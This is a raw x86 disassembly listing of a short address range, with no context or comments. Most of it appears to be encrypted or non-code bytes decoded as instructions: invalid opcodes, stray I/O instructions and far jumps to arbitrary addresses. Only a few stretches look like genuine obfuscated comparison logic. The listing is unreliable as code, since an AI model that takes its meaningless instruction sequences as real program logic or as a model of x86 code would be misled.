  41b2c2:	(bad)  
  41b2c3:	adc    BYTE PTR ds:0x8afc9c3,bh
  41b2c9:	and    DWORD PTR [edi-0x243f24c4],edi
  41b2cf:	cmp    dh,BYTE PTR [esi+esi*2-0x13]
  41b2d3:	pop    esp
  41b2d4:	in     al,dx
  41b2d5:	bswap  esi
  41b2d7:	cmp    ecx,DWORD PTR [ebx+0x43]
  41b2da:	gs inc esi
  41b2dc:	fidivr DWORD PTR [eax-0x19]
  41b2df:	pop    ebx
  41b2e0:	dec    ebx
  41b2e1:	popf   
  41b2e2:	test   al,0xf2
  41b2e4:	fsubr  QWORD PTR [ebx+ebx*2]
  41b2e7:	or     DWORD PTR [ecx+0x4f134655],esp
  41b2ed:	push   ds
  41b2ee:	fst    DWORD PTR [edi+0x6b]
  41b2f1:	mov    al,ds:0xeb805b7f
  41b2f6:	test   ch,bh
  41b2f8:	mov    BYTE PTR [ebp+0x9],cl
  41b2fb:	pop    ebp
  41b2fc:	mov    ebp,0x6ee8824f
  41b301:	mov    BYTE PTR [ebp-0x3e7898d7],cl
  41b307:	add    dl,ch
  41b309:	mov    ds:0x75fb585d,eax
  41b30e:	sbb    cl,BYTE PTR [ebp-0x80]
  41b311:	call   0xaa5:0xdf0f619a
  41b318:	add    edx,DWORD PTR [ebx]
  41b31a:	pushf  
  41b31b:	inc    ebp
  41b31c:	xor    DWORD PTR [edx-0x83af9fe],0x7801901b
  41b326:	retf   
  41b327:	mov    ch,0x6c
  41b329:	xchg   ebx,eax
  41b32a:	sub    eax,0x30a1df
  41b32f:	(bad)  
  41b331:	fst    DWORD PTR [edi]
  41b333:	and    eax,0x2af6d1ee
  41b338:	test   eax,0xb12cb057
  41b33d:	xor    edx,0xca79a577
  41b343:	shrd   edx,eax,0x2
  41b347:	shr    eax,0x2
  41b34a:	mov    DWORD PTR [esp+0x34],eax
  41b34e:	mov    eax,DWORD PTR [esp+0x18]
  41b352:	mov    ecx,DWORD PTR [esp+0x1c]
  41b356:	jmp    0x41b725
  41b35b:	push   ecx
  41b35c:	(bad)  
  41b35e:	or     BYTE PTR ds:0xaa1d2104,bl
  41b364:	sbb    BYTE PTR [ebx+0x7c],dh
  41b367:	dec    edi
  41b368:	inc    edi
  41b369:	mov    DWORD PTR [ebx+edi*4-0x71],edi
  41b36d:	push   ss
  41b36e:	sbb    BYTE PTR [edx+edx*1-0x5c58e7e8],bh
  41b375:	retf   
  41b376:	ficomp WORD PTR [ecx-0x1]
  41b379:	(bad)  
  41b37a:	in     al,dx
  41b37b:	retf   0x46a3
  41b37e:	aam    0x6a
  41b380:	aam    0xc
  41b382:	jns    0x41b36d
  41b384:	ja     0x41b32b
  41b386:	xor    al,0x32
  41b388:	jno    0x41b3ee
  41b38a:	push   0xd831c8d
  41b38f:	sahf   
  41b390:	pop    edi
  41b391:	push   0x39
  41b393:	sbb    DWORD PTR [ebx-0x73],0x29362cc4
  41b39a:	or     DWORD PTR [ecx+0x59d46be9],esp
  41b3a0:	inc    ecx
  41b3a1:	sahf   
  41b3a2:	add    eax,0xe4093b88
  41b3a7:	in     al,0xcb
  41b3a9:	(bad)  
  41b3aa:	std    
  41b3ab:	fiadd  WORD PTR [eax]
  41b3ad:	fisttp WORD PTR [ecx+0x3ffcd755]
  41b3b3:	jne    0x41b415
  41b3b5:	jp     0x41b429
  41b3b7:	add    DWORD PTR [edi-0xd0f592d],esp
  41b3bd:	cs lahf 
  41b3bf:	das    
  41b3c0:	jmp    0x3671:0x6c11495c
  41b3c7:	mov    dl,0x3e
  41b3c9:	mov    ebp,0x94b5bd63
  41b3ce:	test   BYTE PTR [edx+0x7b],cl
  41b3d1:	mul    DWORD PTR [ebp+0x46b33760]
  41b3d7:	dec    esp
  41b3d8:	push   esi
  41b3d9:	sbb    eax,0x6b0bf4da
  41b3de:	add    eax,0x2746f829
  41b3e3:	dec    ecx
  41b3e4:	pop    edi
  41b3e5:	into   
  41b3e6:	inc    ebp
  41b3e7:	jp     0x41b408
  41b3e9:	(bad)  
  41b3ea:	outs   dx,BYTE PTR ds:[esi]
  41b3eb:	dec    edi
  41b3ec:	or     DWORD PTR [esi+ebp*1+0x2b97e46d],esi
  41b3f3:	(bad)  
  41b3f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b3f6:	aad    0x15
  41b3f8:	and    al,0x92
  41b3fa:	(bad)  
  41b3fb:	clts   
  41b3fd:	xchg   ebp,eax
  41b3fe:	cmp    al,0x4e
  41b400:	out    dx,eax
  41b401:	sar    DWORD PTR [ebp-0x3c],1
  41b404:	stc    
  41b405:	jge    0x41b433
  41b407:	jo     0x41b480
  41b409:	rcl    BYTE PTR [edx+0x70],1
  41b40c:	jae    0x41b3e1
  41b40e:	dec    ecx
  41b40f:	nop
  41b410:	lock mov edi,ebp
  41b413:	lods   al,BYTE PTR ds:[esi]
  41b414:	xchg   ebp,eax
  41b415:	ror    BYTE PTR [ecx],1
  41b417:	xchg   DWORD PTR [ebx+0x296aa4b8],ecx
  41b41d:	je     0x41b3cd
  41b41f:	fld    TBYTE PTR [eax]
  41b421:	push   ebx
  41b422:	pop    edx
  41b423:	sub    al,0x74
  41b425:	xor    eax,0x9a5a7b0a
  41b42a:	jbe    0x41b46f
  41b42c:	pop    ss
  41b42d:	pop    ss
  41b42e:	mov    cl,0x21
  41b430:	cli    
  41b431:	push   esp
  41b432:	mov    WORD PTR [ebx+0x69],?
  41b435:	and    esp,ebx
  41b437:	stc    
  41b438:	sub    eax,0xc4c74ec9
  41b43d:	outs   dx,DWORD PTR ds:[esi]
  41b43e:	imul   edx,DWORD PTR [ebx+0x1f],0xffffffb6
  41b442:	leave  
  41b443:	pop    ds
  41b444:	test   al,0x8b
  41b446:	mov    dl,0x0
  41b448:	cld    
  41b449:	push   ebp
  41b44a:	lock fwait
  41b44c:	add    DWORD PTR [ebx-0x7cc11cbd],0xffffff8d
  41b453:	add    eax,0x1761ea0c
  41b458:	cwde   
  41b459:	mov    dh,0xe1
  41b45b:	int3   
  41b45c:	add    al,0x78
  41b45e:	sbb    DWORD PTR [edx+0x4d],edx
  41b461:	cs in  eax,dx
  41b463:	out    dx,al
  41b464:	test   al,0xa0
  41b466:	pop    ebx
  41b467:	fs sub edx,edi
  41b46a:	lea    esp,[edx-0x36]
  41b46d:	in     al,0xbf
  41b46f:	scas   al,BYTE PTR es:[edi]
  41b470:	mov    dh,0xa0
  41b472:	pop    ss
  41b473:	sbb    al,dl
  41b475:	or     DWORD PTR [edi-0x7cb5d9ff],0xffffffc0
  41b47c:	inc    edx
  41b47d:	push   cs
  41b47e:	xlat   BYTE PTR ds:[ebx]
  41b47f:	lods   al,BYTE PTR ds:[esi]
  41b480:	in     eax,dx
  41b481:	stc    
  41b482:	mov    ecx,0x93ac1175
  41b487:	mov    edi,0xbed2731d
  41b48c:	cmp    BYTE PTR [eax],bl
  41b48e:	dec    ecx
  41b48f:	jmp    0x5777dae
  41b494:	stos   BYTE PTR es:[edi],al
  41b495:	std    
  41b496:	cli    
  41b497:	out    0x83,al
  41b499:	stc    
  41b49a:	(bad)  
  41b49b:	sbb    al,0xf9
  41b49d:	test   DWORD PTR [edx],ecx
  41b49f:	mov    al,BYTE PTR [ecx]
  41b4a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b4a2:	adc    ah,dh
  41b4a4:	fs aas 
  41b4a6:	sti    
  41b4a7:	rol    DWORD PTR [edi+0x10],1
  41b4aa:	js     0x41b46e
  41b4ac:	and    dh,BYTE PTR [ebx+edx*8+0x48]
  41b4b0:	inc    esi
  41b4b1:	adc    ecx,DWORD PTR [eax]
  41b4b3:	push   0x91c94311
  41b4b8:	jbe    0x41b462
  41b4ba:	mov    ebx,0xde030a3e
  41b4bf:	hlt    
  41b4c0:	aaa    
  41b4c1:	(bad)
  41b4c5:	cmc    
  41b4c6:	pop    ss
  41b4c7:	mov    eax,ds:0x22367411
  41b4cc:	scas   al,BYTE PTR es:[edi]
  41b4cd:	add    esp,esp
  41b4cf:	mov    esi,0x4c8decda
  41b4d4:	sub    DWORD PTR [esi],ebx
  41b4d6:	lds    esp,FWORD PTR [edx+0x688dad0d]
  41b4dc:	jge    0x41b541
  41b4de:	retf   
  41b4df:	fsubr  QWORD PTR [eax-0x6f335e9a]
  41b4e5:	sub    bh,bh
  41b4e7:	or     DWORD PTR [ebx],0x1
  41b4ea:	push   ds
  41b4eb:	(bad)  [ebp-0xf]
  41b4ee:	stos   DWORD PTR es:[edi],eax
  41b4ef:	ror    DWORD PTR [edi+0x48cd5aeb],0x88
  41b4f6:	jne    0x41b531
  41b4f8:	add    cl,BYTE PTR [edx+edi*1-0x3eba5bd2]
  41b4ff:	(bad)
  41b504:	in     al,dx
  41b505:	inc    ebx
  41b506:	in     al,dx
  41b507:	inc    esp
  41b508:	stos   DWORD PTR es:[edi],eax
  41b509:	lods   eax,DWORD PTR ds:[esi]
  41b50a:	jns    0x41b497
  41b50c:	and    al,0xfe
  41b50e:	inc    esi
  41b50f:	stos   DWORD PTR es:[edi],eax
  41b510:	(bad)  
  41b511:	das    
  41b512:	lds    edi,FWORD PTR [edi]
  41b514:	call   0xa4345406
  41b519:	cld    
  41b51a:	repnz (bad) [esi]
  41b51d:	mov    ebp,0xdac383e0
  41b522:	adc    al,0x82
  41b524:	and    DWORD PTR [esi+eax*4-0x59],ecx
  41b528:	dec    DWORD PTR [edi]
  41b52a:	fadd   QWORD PTR [ecx-0x6ffe33d9]
  41b530:	out    dx,eax
  41b531:	bnd jle 0x41b4f0
  41b534:	push   0x54
  41b536:	imul   edx,esi,0x8bbe2902
  41b53c:	mov    ah,0x78
  41b53e:	cmp    BYTE PTR [eax-0x32],dh
  41b541:	imul   edx,esi,0x4384a0bf
  41b547:	xchg   esi,eax
  41b548:	jl     0x41b521
  41b54a:	test   DWORD PTR [ebx+0x7e],ecx
  41b54d:	mov    al,ds:0x65f530d2
  41b552:	jle    0x41b5cb
  41b554:	add    BYTE PTR [ebp+0x14],0x87
  41b558:	stos   BYTE PTR es:[edi],al
  41b559:	cmp    al,0x42
  41b55b:	inc    ecx
  41b55c:	sti    
  41b55d:	mov    cl,0x7e
  41b55f:	mov    bl,0x6e
  41b561:	dec    eax
  41b562:	add    eax,0xd1f7a4f
  41b567:	xchg   ecx,eax
  41b568:	jg     0x41b4ec
  41b56a:	mov    eax,ebp
  41b56c:	mov    al,ds:0x8d2511ea
  41b571:	dec    ebp
  41b572:	out    0xa9,al
  41b574:	mov    ah,0x29
  41b576:	pop    ecx
  41b577:	jmp    0xf98:0x685f8ef6
  41b57e:	push   cs
  41b57f:	jo     0x41b5ec
  41b581:	(bad)  
  41b582:	clc    
  41b583:	repnz push 0x20
  41b586:	pop    eax
  41b587:	mov    ebx,0x6837dfe3
  41b58c:	jle    0x80d3fa68
  41b592:	mov    ds:0x169d448,al
  41b597:	xchg   edx,eax
  41b598:	daa    
  41b599:	jl     0x41b53b
  41b59b:	repz jmp 0x41b52f
  41b59e:	das    
  41b59f:	popa   
  41b5a0:	(bad)  
  41b5a1:	out    dx,eax
  41b5a2:	int3   
  41b5a3:	fstp   QWORD PTR [ecx]
  41b5a5:	jge    0x41b5db
  41b5a7:	or     DWORD PTR [ebx+0x1f6eaa5f],ebp
  41b5ad:	iret   
  41b5ae:	xor    DWORD PTR [edx-0x66235a69],eax
  41b5b4:	adc    eax,0x580d46c4
  41b5b9:	mov    eax,0x444323db
  41b5be:	cmp    edi,DWORD PTR [eax+esi*8]
  41b5c1:	hlt    
  41b5c2:	mov    ds:0x9bd283e3,al
  41b5c7:	push   ss
  41b5c8:	push   esi
  41b5c9:	cmp    ecx,DWORD PTR [edx+ebx*8-0x12fe45e1]
  41b5d0:	lods   al,BYTE PTR ds:[esi]
  41b5d1:	sub    ah,BYTE PTR [edx-0x31b2cc1f]
  41b5d7:	xchg   edi,eax
  41b5d8:	out    0x44,eax
  41b5da:	xchg   BYTE PTR [ecx],bl
  41b5dc:	hlt    
  41b5dd:	imul   DWORD PTR [ecx]
  41b5df:	ds jg  0x41b591
  41b5e2:	add    eax,0x2e6ccf10
  41b5e7:	arpl   WORD PTR [edi+0x45],di
  41b5ea:	jo     0x41b5c5
  41b5ec:	cli    
  41b5ed:	jo     0x41b57d
  41b5ef:	add    BYTE PTR [edi+0x48],ch
  41b5f2:	jo     0x41b5ee
  41b5f4:	(bad)  
  41b5f5:	push   DWORD PTR [edi+esi*1]
  41b5f8:	xor    al,0xba
  41b5fa:	or     al,0x1e
  41b5fc:	mov    dh,0x4e
  41b5fe:	mov    edi,0xb2a3de60
  41b603:	add    al,0x4a
  41b605:	mov    ebx,0xae167942
  41b60a:	inc    esp
  41b60b:	pop    ecx
  41b60c:	add    al,0x25
  41b60e:	repnz in eax,dx
  41b610:	mov    eax,ds:0x82e95d75
  41b615:	imul   esi,esp,0xd
  41b618:	and    ebx,DWORD PTR ds:[eax+eax*8]
  41b61c:	or     eax,DWORD PTR [ebp+edi*8-0x65]
  41b620:	jmp    0xe093:0x4023ecf6
  41b627:	cmp    al,BYTE PTR [eax+0x5d1f260]
  41b62d:	and    al,0x28
  41b62f:	(bad)  
  41b630:	pop    ds
  41b631:	loopne 0x41b666
  41b633:	jmp    0x41b5e2
  41b635:	xor    BYTE PTR [eax],dl
  41b637:	repz scas al,BYTE PTR es:[edi]
  41b639:	int3   
  41b63a:	pop    edx
  41b63b:	jmp    0x2aae:0x1d7f5ec0
  41b642:	mov    BYTE PTR [edi+0x39],cl
  41b645:	jp     0x41b5f7
  41b647:	mov    fs,WORD PTR [ebx]
  41b649:	es (bad) 
  41b64b:	xchg   BYTE PTR [esi+0x587e5789],dl
  41b651:	call   0xea214526
  41b656:	pop    es
  41b657:	fsubr  st,st(5)
  41b659:	popf   
  41b65a:	xchg   esi,eax
  41b65b:	jg     0x41b653
  41b65d:	stos   DWORD PTR es:[edi],eax
  41b65e:	pop    es
  41b65f:	je     0x41b623
  41b661:	test   eax,0x9d59758f
  41b666:	sub    DWORD PTR [ebp-0x790a5730],edi
  41b66c:	lea    edx,ds:0x854874d7
  41b672:	xor    BYTE PTR [esi+0x58542f2a],al
  41b678:	loop   0x41b661
  41b67a:	mov    BYTE PTR [edx-0x6a],bh
  41b67d:	push   esi
  41b67e:	ficomp WORD PTR [ecx+0x9]
  41b681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b682:	jne    0x41b619
  41b684:	fwait
  41b685:	iret   
  41b686:	fistp  DWORD PTR [ecx+0x4dcaf1ca]
  41b68c:	add    cl,al
  41b68e:	mov    esi,0x7e41e519
  41b693:	test   al,0xb
  41b695:	aaa    
  41b696:	jae    0x41b6b1
  41b698:	pop    edi
  41b699:	popf   
  41b69a:	mov    gs,WORD PTR [ecx]
  41b69c:	jg     0x41b6c3
  41b69e:	popf   
  41b69f:	cmp    dh,BYTE PTR [edx-0x1ad451ef]
  41b6a5:	dec    ecx
  41b6a6:	fisub  DWORD PTR [edi]
  41b6a8:	dec    ecx
  41b6a9:	in     al,dx
  41b6aa:	sti    
  41b6ab:	jg     0x41b704
  41b6ad:	xor    eax,0x681ee38b
  41b6b2:	aas    
  41b6b3:	inc    esi
  41b6b4:	repnz (bad) 
  41b6b6:	cmp    eax,0x77d66515
  41b6bb:	loop   0x41b6ca
  41b6bd:	xchg   esi,eax
  41b6be:	pushf  
  41b6bf:	sahf   
  41b6c0:	sbb    BYTE PTR [ecx+ecx*4],dh
  41b6c3:	inc    edx
  41b6c4:	sub    eax,0x44945a32
  41b6c9:	test   eax,0x4a7d0eb6
  41b6ce:	rcl    esi,cl
  41b6d0:	stc    
  41b6d1:	inc    ecx
  41b6d2:	mov    edx,0x9dabb044
  41b6d7:	(bad)  
  41b6d8:	push   0xffffffa1
  41b6da:	lea    esi,[edx-0x53]
  41b6dd:	or     al,BYTE PTR [ebp+0x1e061446]
  41b6e3:	call   0x8f37:0x41a7fe47
  41b6ea:	rol    ebp,cl
  41b6ec:	pop    ebx
  41b6ed:	push   0xa30540f
  41b6f2:	imul   eax,DWORD PTR [edi-0x2daef288],0x672a1526
  41b6fc:	nop
  41b6fd:	or     DWORD PTR [ebx+0x3],edx
  41b700:	out    dx,al
  41b701:	rcr    bl,cl
  41b703:	test   eax,0xec767aec
  41b708:	mov    ch,0x29
  41b70a:	dec    eax
  41b70b:	int    0x1e
  41b70d:	sub    al,0xe1
  41b70f:	xchg   BYTE PTR [esp+ebx*2+0x36cbea03],al
  41b716:	inc    ecx
  41b717:	jg     0x41b724
  41b719:	enter  0x6bd3,0x57
  41b71d:	repnz dec eax
  41b71f:	mov    edx,0xd28edc52
  41b724:	faddp  st(1),st
  41b726:	loopne 0x41b746
  41b728:	xor    eax,0x40000000
  41b72d:	or     eax,DWORD PTR [esp+0x34]
  41b731:	xor    ecx,ecx
  41b733:	mov    DWORD PTR [esp+0x14],eax
  41b737:	mov    eax,DWORD PTR [esp+0x60]
  41b73b:	or     ecx,edx
  41b73d:	cdq    
  41b73e:	cmp    ecx,eax
  41b740:	jne    0x41d926
  41b746:	cmp    DWORD PTR [esp+0x14],edx
  41b74a:	jne    0x41d926
  41b750:	mov    DWORD PTR [esp+0x5c],0x422604
  41b758:	mov    DWORD PTR [esp+0x68],0x4225fc
  41b760:	mov    eax,DWORD PTR [esp+0x78]
  41b764:	mov    eax,DWORD PTR [esp+0x78]
  41b768:	mov    edx,DWORD PTR [esp+0x18]
  41b76c:	xor    ecx,ecx
  41b76e:	shld   ecx,eax,0x2
  41b772:	shl    eax,0x2
  41b775:	mov    DWORD PTR [esp+0x10],edx
  41b779:	mov    edx,DWORD PTR [esp+0x1c]
  41b77d:	xor    eax,ebx
  41b77f:	xor    ecx,esi
  41b781:	mov    DWORD PTR [esp+0x14],edx
  41b785:	cmp    DWORD PTR [esp+0x10],eax
  41b789:	jne    0x41c8ee
  41b78f:	cmp    edx,ecx
  41b791:	jne    0x41c8ee
  41b797:	mov    DWORD PTR [esp+0x30],0x42258c
  41b79f:	mov    eax,DWORD PTR [esp+0x18]
  41b7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41b7a7:	shrd   eax,ecx,0x2
  41b7ab:	shr    ecx,0x2
  41b7ae:	mov    ecx,DWORD PTR [esp+0x18]
  41b7b2:	mov    edx,DWORD PTR [esp+0x1c]
  41b7b6:	mov    edx,DWORD PTR [esp+0x30]
  41b7ba:	mov    edx,DWORD PTR [edx+0xc]
  41b7bd:	mov    DWORD PTR [esp+0xc],eax
  41b7c1:	shl    ecx,0x1e
  41b7c4:	mov    eax,0x329e695d
  41b7c9:	xor    DWORD PTR [esp+0xc],eax
  41b7cd:	xor    ecx,ecx
  41b7cf:	or     ecx,DWORD PTR [esp+0xc]
  41b7d3:	cmp    ecx,DWORD PTR [edx]
  41b7d5:	jne    0x41c888
  41b7db:	mov    ecx,0x65c7
  41b7e0:	mov    WORD PTR [esp+0x2c],cx
  41b7e5:	mov    ecx,0x6062
  41b7ea:	mov    WORD PTR [esp+0x24],cx
  41b7ef:	mov    ecx,0x125d
  41b7f4:	mov    WORD PTR [esp+0xc],cx
  41b7f9:	movzx  ecx,WORD PTR [esp+0xc]
  41b7fe:	mov    edx,0x2d0f
  41b803:	jmp    0x41bbd2
  41b808:	push   edi
  41b809:	and    BYTE PTR [ebx+0x236a9a6f],bh
  41b80f:	and    BYTE PTR [edx-0x4b55d674],dh
  41b815:	cmp    ebp,esp
  41b817:	mov    esi,0x1816895e
  41b81c:	mov    esp,0x51181812
  41b821:	fstp   DWORD PTR [ebx-0x8]
  41b824:	mov    bh,0x5d
  41b826:	xor    eax,0x9cf7e9ae
  41b82b:	add    cl,BYTE PTR [esi+0x5e395d92]
  41b831:	adc    dh,BYTE PTR [eax]
  41b833:	push   ebx
  41b834:	inc    ebp
  41b835:	sti    
  41b836:	arpl   WORD PTR es:[eax-0x49bb4959],sp
  41b83d:	jl     0x41b7c4
  41b83f:	push   esp
  41b840:	pop    esp
  41b841:	add    BYTE PTR fs:[ebx-0x2966aaff],dh
  41b848:	scas   al,BYTE PTR es:[edi]
  41b849:	rol    DWORD PTR [eax+0x60],1
  41b84c:	mov    bh,0x61
  41b84e:	sbb    DWORD PTR [esi],ecx
  41b850:	sub    ch,al
  41b852:	stc    
  41b853:	pop    esi
  41b854:	mov    BYTE PTR [ecx+ecx*8-0xa],dl
  41b858:	cwde   
  41b859:	test   esp,esp
  41b85b:	sub    al,0x51
  41b85d:	adc    cl,0x6a
  41b860:	scas   eax,DWORD PTR es:[edi]
  41b861:	and    esp,DWORD PTR [ebp+0x46da49f7]
  41b867:	mov    ebp,0xb07f2f3e
  41b86c:	cdq    
  41b86d:	cmp    BYTE PTR [ebp-0x4c],dl
  41b870:	jae    0x41b849
  41b872:	push   edx
  41b873:	mov    DWORD PTR [eax],esp
  41b875:	add    al,0x10
  41b877:	push   esi
  41b878:	xchg   dh,bl
  41b87a:	clc    
  41b87b:	leave  
  41b87c:	inc    edx
  41b87d:	fiadd  DWORD PTR [ebx-0x3f]
  41b880:	call   0x56d8588d
  41b885:	xchg   BYTE PTR [edi-0x42],ah
  41b888:	aas    
  41b889:	int3   
  41b88a:	sbb    BYTE PTR [edi+0x31],dl
  41b88d:	cmp    ah,BYTE PTR [ebp+0x45]
  41b890:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b891:	ss sbb al,0xe6
  41b894:	cmp    al,0x77
  41b896:	lock mov bl,0x6e
  41b899:	jo     0x41b8a0
  41b89b:	inc    eax
  41b89c:	mov    ch,0x68
  41b89e:	(bad)
  41b8a1:	sahf   
  41b8a2:	fisub  WORD PTR [edx-0x17]
  41b8a5:	pop    ecx
  41b8a6:	and    bh,0xc
  41b8a9:	xor    ebp,ebx
  41b8ab:	pushf  
  41b8ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b8ad:	repnz xlat BYTE PTR ds:[ebx]
  41b8af:	inc    ebx
  41b8b0:	das    
  41b8b1:	fs add al,0x82
  41b8b4:	pop    ebx
  41b8b5:	xor    dh,al
  41b8b7:	call   0x99fa:0xb35f5da5
  41b8be:	add    ch,dh
  41b8c0:	sub    cl,bh
  41b8c2:	adc    ebp,ecx
  41b8c4:	push   cs
  41b8c5:	xchg   esi,eax
  41b8c6:	add    eax,0x7fb4fdc1
  41b8cb:	inc    ebx
  41b8cc:	rol    BYTE PTR [eax],1
  41b8ce:	cmp    DWORD PTR [ebp+0x24],ebx
  41b8d1:	stos   BYTE PTR es:[edi],al
  41b8d2:	sbb    edx,ebp
  41b8d4:	data16 fcmovnu st,st(0)
  41b8d7:	sti    
  41b8d8:	xor    DWORD PTR [ebp+0x6b97ed04],ebx
  41b8de:	xor    eax,0xef7e9dc3
  41b8e3:	sub    eax,0x1d168441
  41b8e8:	adc    DWORD PTR [esi-0x2ae1ba5],0x69a262ae
  41b8f2:	aam    0xa4
  41b8f4:	adc    al,0xa3
  41b8f6:	jge    0x41b8ad
  41b8f8:	pop    DWORD PTR [ebx-0x16]
  41b8fb:	pop    ebx
  41b8fc:	mov    DWORD PTR [ecx],ebp
  41b8fe:	adc    ch,BYTE PTR [edi*1+0x3a1cdff9]
  41b905:	(bad)  
  41b906:	sub    eax,0xb0bc2b35
  41b90b:	mov    ebp,0xf5efcaff
  41b910:	arpl   WORD PTR [esi],sp
  41b912:	jmp    0x41b941
  41b914:	aas    
  41b915:	or     al,0x26
  41b917:	test   BYTE PTR [ecx+0x464d6e3e],al
  41b91d:	arpl   WORD PTR [esi],bp
  41b91f:	fcomi  st,st(1)
  41b921:	fistp  QWORD PTR [eax]
  41b923:	xor    ch,dl
  41b925:	mov    es,WORD PTR [eax+ebx*8]
  41b928:	fdivp  st(4),st
  41b92a:	lods   eax,DWORD PTR ds:[esi]
  41b92b:	outs   dx,DWORD PTR ds:[esi]
  41b92c:	jle    0x41b93b
  41b92e:	sub    eax,DWORD PTR [ebp-0x3a]
  41b931:	or     ch,BYTE PTR [edi]
  41b933:	dec    edi
  41b934:	out    dx,al
  41b935:	in     al,0x86
  41b937:	adc    eax,0x97a2d29c
  41b93c:	inc    edx
  41b93d:	mov    al,ds:0x8d8404dd
  41b942:	scas   eax,DWORD PTR es:[edi]
  41b943:	sar    BYTE PTR [edi],0x18
  41b946:	fcom   DWORD PTR [esp+ecx*4+0x4e124ba9]
  41b94d:	pushf  
  41b94e:	add    ch,BYTE PTR [ecx-0x1db54b1d]
  41b954:	sbb    al,0x53
  41b956:	xor    ebp,DWORD PTR [edx+0x57]
  41b959:	iret   
  41b95a:	pusha  
  41b95b:	and    BYTE PTR [esi],cl
  41b95d:	or     cl,dh
  41b95f:	sub    eax,0x2264011e
  41b964:	or     DWORD PTR [eax],esi
  41b966:	pop    esi
  41b967:	out    0xf3,al
  41b969:	call   0xcc9baa81
  41b96e:	dec    esi
  41b96f:	(bad)  
  41b970:	lods   al,BYTE PTR ds:[esi]
  41b971:	push   edx
  41b972:	cmp    dl,ch
  41b974:	jmp    0xd1dd:0x1efce453
  41b97b:	(bad)  
  41b97c:	arpl   WORD PTR [ecx-0x23],ax
  41b97f:	cmp    al,dh
  41b981:	sti    
  41b982:	push   0xffffff9f
  41b984:	sub    BYTE PTR [edi+0x2d],0x81
  41b988:	repz and BYTE PTR [ecx+0x1a],bh
  41b98c:	test   edi,eax
  41b98e:	ins    BYTE PTR es:[edi],dx
  41b98f:	jp     0x41b9b6
  41b991:	adc    ah,BYTE PTR [edi-0x34264ed2]
  41b997:	and    BYTE PTR [edi],bl
  41b999:	xchg   ebx,eax
  41b99a:	sub    dl,BYTE PTR [edi+0x27]
  41b99d:	add    BYTE PTR [eax+0x7],bl
  41b9a0:	pusha  
  41b9a1:	mov    eax,0xe3f575c6
  41b9a6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9a7:	push   eax
  41b9a8:	outs   dx,DWORD PTR ds:[esi]
  41b9a9:	jle    0x41ba12
  41b9ab:	push   edi
  41b9ac:	adc    esp,eax
  41b9ae:	mov    dl,cl
  41b9b0:	mov    cl,0xee
  41b9b2:	bound  esp,QWORD PTR [esi-0x13]
  41b9b5:	jae    0x41b94d
  41b9b7:	adc    edx,ebx
  41b9b9:	xchg   DWORD PTR [esi],ebx
  41b9bb:	jns    0x41b9af
  41b9bd:	fild   WORD PTR [ecx-0x1deda915]
  41b9c3:	push   esi
  41b9c4:	add    BYTE PTR [ebp+0x2f],cl
  41b9c7:	pop    edx
  41b9c8:	mov    esi,0x17e43d7f
  41b9cd:	xor    ebx,DWORD PTR [edx+0x8]
  41b9d0:	jl     0x41b9d6
  41b9d2:	pushf  
  41b9d3:	fldenv [eax+0x48ede727]
  41b9d9:	dec    eax
  41b9da:	pop    edi
  41b9db:	mov    bh,BYTE PTR [ebx-0x4cd50e06]
  41b9e1:	inc    esp
  41b9e2:	bound  ebx,QWORD PTR ds:0x718d5227
  41b9e8:	mov    BYTE PTR [edi],bh
  41b9ea:	jl     0x41b9dc
  41b9ec:	fild   WORD PTR [ecx-0x46]
  41b9ef:	jl     0x41ba4e
  41b9f1:	mov    ds:0x1d348e32,eax
  41b9f6:	mov    al,0xdb
  41b9f8:	outs   dx,BYTE PTR ds:[esi]
  41b9f9:	mov    DWORD PTR ss:[eax],ebx
  41b9fc:	adc    ch,al
  41b9fe:	cmp    DWORD PTR [ecx],eax
  41ba00:	mov    edx,0x840e93ce
  41ba05:	inc    eax
  41ba06:	add    DWORD PTR [edi+0x2106d132],0x1a501235
  41ba10:	adc    BYTE PTR [eax+0x37],bh
  41ba13:	mov    edi,0xb4f06e91
  41ba18:	sbb    edi,DWORD PTR [edi-0x31]
  41ba1b:	idiv   BYTE PTR [esp+ebp*2]
  41ba1e:	mov    dh,0x58
  41ba20:	repz push ebp
  41ba22:	cmp    edx,edi
  41ba24:	xchg   ebp,eax
  41ba25:	sahf   
  41ba26:	mov    bh,ah
  41ba28:	mov    edi,0xd11f5be
  41ba2d:	aaa    
  41ba2e:	aad    0x8e
  41ba30:	je     0x41ba2e
  41ba32:	bndldx (bad),[edx+ebp*2]
  41ba36:	adc    esi,DWORD PTR fs:[ecx]
  41ba39:	lahf   
  41ba3a:	mov    ch,0x3f
  41ba3c:	clc    
  41ba3d:	pop    edx
  41ba3e:	pop    ebx
  41ba3f:	mov    bl,0xcb
  41ba41:	aad    0xfa
  41ba43:	mov    ebx,0x835a912d
  41ba48:	add    BYTE PTR [edi],dh
  41ba4a:	repz in al,0x6d
  41ba4d:	push   es
  41ba4e:	fsub   QWORD PTR [edi+0x731303ea]
  41ba54:	mov    dh,0x5d
  41ba56:	dec    BYTE PTR [edx]
  41ba58:	inc    eax
  41ba59:	jmp    0x1472:0xf4a9d703
  41ba60:	fs int3 
  41ba62:	dec    esp
  41ba63:	das    
  41ba64:	or     ebx,DWORD PTR [ebx+esi*1-0x980779a]
  41ba6b:	push   edx
  41ba6c:	add    BYTE PTR [esi*1+0x79d5b0f0],ch
  41ba73:	jge    0x41ba1d
  41ba75:	jmp    0x4817:0xdf0c7066
  41ba7c:	sub    DWORD PTR [ecx-0x74dcb192],edi
  41ba82:	scas   eax,DWORD PTR es:[edi]
  41ba83:	inc    esi
  41ba84:	hlt    
  41ba85:	jae    0x684d3a20
  41ba8b:	jg     0x41ba3b
  41ba8d:	adc    ecx,DWORD PTR [esi-0x5c]
  41ba90:	iret   
  41ba91:	mov    ds:0x79048560,al
  41ba96:	in     al,0xb
  41ba98:	sar    bh,cl
  41ba9a:	jecxz  0x41babf
  41ba9c:	nop
  41ba9d:	xchg   DWORD PTR [esp+ecx*8-0x4c999567],ebx
  41baa4:	jne    0x41ba2a
  41baa6:	pop    ecx
  41baa7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
